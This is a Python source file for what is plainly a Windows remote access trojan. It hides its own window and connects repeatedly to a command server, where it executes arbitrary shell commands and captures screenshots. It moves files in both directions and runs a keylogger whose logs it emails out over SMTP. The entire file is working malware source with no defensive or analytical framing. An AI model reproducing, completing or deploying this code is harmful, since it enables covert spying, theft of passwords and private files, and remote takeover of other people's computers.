import os
import smtplib
import socket
import subprocess
from threading import Thread

import PIL.ImageGrab
import win32con
import win32gui
from pynput import keyboard

the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
username, password, destination_email = "", "", ""
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 6666
BUFFER_SIZE = 1024

exit_keylogger = False
key_logger = open("key_log.txt", "a")


def send_email(user, pwd, recipient):
    FROM = user
    TO = recipient if isinstance(recipient, list) else [recipient]
    SUBJECT = "Key Logs"
    TEXT = ""
    with open("key_log.txt", "r") as read_file:
        TEXT = read_file.read()

    # Prepare actual message
    message = """From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(user, pwd)
        server.sendmail(FROM, TO, message)
        server.close()
        return True
    except:
        return False


def start_keylogger():
    global exit_keylogger
    exit_keylogger = False
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()


def stop_keylogger():
    global exit_keylogger
    exit_keylogger = True


def on_press(key):
    pass


def on_release(key):
    global exit_keylogger
    data = '{0} released'.format(
        key)
    key_logger.write(data + "\n")
    key_logger.flush()
    if exit_keylogger == True:
        # Stop listener
        return False


def run_command(cmd):
    pipe = subprocess.getoutput(cmd)
    if len(pipe) == 0:
        return "Command Executed But No Output"
    else:
        return str(pipe)


def screenshot():
    image = PIL.ImageGrab.grab()
    image.save("screenshot.png")
    tosend_file = open('screenshot.png', 'rb')
    Filetosend = tosend_file.read(10000000)
    tosend_file.close()
    os.remove("screenshot.png")
    s.send(Filetosend)


def send_file(file):
    print(file)
    try:
        tosend_file = open(file.strip(), 'rb')
        Filetosend = tosend_file.read(1000000000)
        tosend_file.close()
        s.send(Filetosend)
    except Exception as e:
        print(e)
        print("error")
        s.send("Error".encode())


def download_file(name):
    try:
        FILETORECV = s.recv(1000000000)
        recv_file = open(f"{name}", 'wb')
        recv_file.write(FILETORECV)
        recv_file.close()
    except Exception as e:
        print(e)
        pass


while True:
    try:
        # create the socket object
        s = socket.socket()
        # connect to the server
        s.connect((SERVER_HOST, SERVER_PORT))

        # receive the greeting message
        message = s.recv(BUFFER_SIZE).decode()
        print("Server:", message)
        while True:
            # receive the command from the server
            command = s.recv(BUFFER_SIZE).decode()
            if command.lower() == "exit":
                exit()
                break
            elif command.lower()[:3] == "run":
                output = run_command(command.lower()[3:].strip())
                s.send(output.encode())
            elif command.lower() == "screenshot":
                screenshot()
            elif command.lower()[:8] == "download":
                send_file(command.lower()[8:])
            elif command.lower()[:6] == "upload":
                print(command.lower()[6:])
                download_file(command.lower()[6:].strip())
            elif command.lower() == "start_keylogger":
                s.send("Started Keylogger".encode())
                Thread(target=start_keylogger).start()
            elif command.lower() == "stop_keylogger":
                Thread(target=stop_keylogger).start()
                sent_bool = send_email(username, password, destination_email)
                if sent_bool:
                    s.send("Stopped Keylogger and mail sent".encode())
                else:
                    s.send("Stopped Keylogger and mail didnt sent".encode())
            else:
                s.send("Invalid Command".encode())

        # close client connection
        s.close()
    except:
        pass
